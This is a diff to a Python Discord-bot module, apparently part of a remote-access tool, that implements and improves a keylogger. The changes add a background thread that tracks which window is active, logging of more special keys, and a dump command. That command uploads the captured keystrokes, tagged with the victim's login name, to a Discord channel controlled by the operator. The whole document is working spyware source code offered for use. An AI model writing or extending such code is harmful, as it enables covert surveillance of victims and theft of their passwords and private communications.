@@ -3,6 +3,7 @@ import discord
 from discord.ext import commands
 from pynput import keyboard
 import threading
+import asyncio
 import time
 from datetime import datetime
 from src.client.core.platform import Platform
@@ -14,17 +15,18 @@ class Keylogger(commands.Cog):
         self.is_logging = False
         self.listener = None
         self.current_window = ""
+        self.window_lock = threading.Lock()
         
     def get_active_window(self):
-        """Try to get the active window title in a cross-platform way."""
+        """Internal helper to fetch the active window title."""
         try:
             if Platform.is_windows():
                 import pygetwindow as gw
                 window = gw.getActiveWindow()
                 return window.title if window else "Unknown"
             elif Platform.is_linux():
-                # Basic Linux implementation using xdotool if available
                 import subprocess
+                # Check for xdotool presence once? No, just try to run it.
                 result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], 
                                      capture_output=True, text=True, timeout=1)
                 return result.stdout.strip() if result.returncode == 0 else "Linux Window"
@@ -32,17 +34,21 @@ class Keylogger(commands.Cog):
         except:
             return "N/A"
 
+    def _window_tracker(self):
+        """Background thread to update the active window title periodically."""
+        while self.is_logging:
+            new_window = self.get_active_window()
+            with self.window_lock:
+                if new_window != self.current_window:
+                    self.current_window = new_window
+                    self.log_buffer += f"\n\n--- [Window: {self.current_window}] ---\n"
+            time.sleep(5) # Update every 5 seconds
+
     def on_press(self, key):
         if not self.is_logging:
             return False
             
         try:
-            # Track window changes
-            active_window = self.get_active_window()
-            if active_window != self.current_window:
-                self.current_window = active_window
-                self.log_buffer += f"\n\n--- [Window: {self.current_window}] ---\n"
-
             # Handle special keys
             if hasattr(key, 'char') and key.char is not None:
                 self.log_buffer += key.char
@@ -54,6 +60,12 @@ class Keylogger(commands.Cog):
                     self.log_buffer += "\n"
                 elif k == "backspace":
                     self.log_buffer += " [BACKSPACE] "
+                elif k == "tab":
+                    self.log_buffer += " [TAB] "
+                elif k == "caps_lock":
+                    self.log_buffer += " [CAPS] "
+                elif k in ["shift", "shift_r", "ctrl", "ctrl_r", "alt", "alt_gr", "cmd", "cmd_r"]:
+                    pass # Don't log modifier keys alone to keep logs clean
                 else:
                     self.log_buffer += f" [{k.upper()}] "
         except Exception as e:
@@ -66,8 +78,15 @@ class Keylogger(commands.Cog):
             return
 
         self.is_logging = True
+        self.log_buffer += f"\n--- Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
+        
+        # Start the listener
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
+        
+        # Start the window tracker thread
+        threading.Thread(target=self._window_tracker, daemon=True).start()
+        
         await ctx.send("✅ Keylogger started.")
 
     @commands.command(name="keylog_stop", help="Stop the keylogger.")
@@ -79,6 +98,7 @@ class Keylogger(commands.Cog):
         self.is_logging = False
         if self.listener:
             self.listener.stop()
+        
         await ctx.send("🛑 Keylogger stopped.")
 
     @commands.command(name="keylog_dump", help="Dump the current keylogs.")
@@ -87,18 +107,25 @@ class Keylogger(commands.Cog):
             await ctx.send("📝 No logs captured yet.")
             return
 
-        # Discord has a 2000 character limit, so we send it as a file
+        # Prepare filename
         log_file = f"keylogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        with open(log_file, "w", encoding="utf-8") as f:
-            f.write(self.log_buffer)
-
-        discord_file = discord.File(log_file)
-        await ctx.send(f"📄 Keylogs for {ctx.author.name}:", file=discord_file)
         
-        # Clean up local file
-        os.remove(log_file)
-        # Optional: Clear buffer after dump
-        # self.log_buffer = ""
+        try:
+            with open(log_file, "w", encoding="utf-8") as f:
+                f.write(self.log_buffer)
+
+            await ctx.send(f"📄 Keylogs for `{os.getlogin()}`:", file=discord.File(log_file))
+            os.remove(log_file)
+            
+            # Optional: Ask if buffer should be cleared?
+            # For now, we keep it to prevent data loss if upload fails
+        except Exception as e:
+            await ctx.send(f"❌ Error dumping logs: {str(e)}")
+
+    @commands.command(name="keylog_clear", help="Clear the current keylog buffer.")
+    async def clear_logs(self, ctx):
+        self.log_buffer = ""
+        await ctx.send("🧹 Keylog buffer cleared.")
 
 async def setup(bot):
     await bot.add_cog(Keylogger(bot))
